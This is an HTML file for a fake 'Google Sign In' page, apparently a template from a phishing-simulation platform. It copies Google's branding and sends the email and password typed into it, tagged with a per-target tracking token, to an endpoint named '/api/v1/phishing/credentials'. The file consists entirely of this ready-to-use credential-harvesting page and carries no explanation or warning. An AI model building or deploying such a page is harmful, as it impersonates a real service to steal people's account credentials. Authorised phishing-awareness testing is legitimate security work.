<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Google Sign In</title>
<style>
body{
background:#F4F6FB;
font-family:Arial;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}
.card{
background:white;
padding:40px;
width:420px;
border-radius:12px;
box-shadow:0 8px 24px rgba(0,0,0,.15);
}
.logo{
color:#EA4335;
font-size:30px;
font-weight:bold;
text-align:center;
margin-bottom:20px;
}
input{
width:100%;
padding:12px;
margin:12px 0;
border:1px solid #CBD5E1;
border-radius:8px;
}
button{
width:100%;
padding:12px;
background:#EA4335;
color:white;
border:none;
border-radius:8px;
font-weight:bold;
}
</style>
</head>

<body>

<div class="card">

<div class="logo">
Google
</div>

<form method="POST" action="/api/v1/phishing/credentials">

<input name="username" placeholder="Email"/>

<input name="password" placeholder="Password" type="password"/>

<input type="hidden" name="tracking_token" value="{TOKEN}"/>

<button type="submit">
Sign In
</button>

</form>

</div>

</body>
</html>
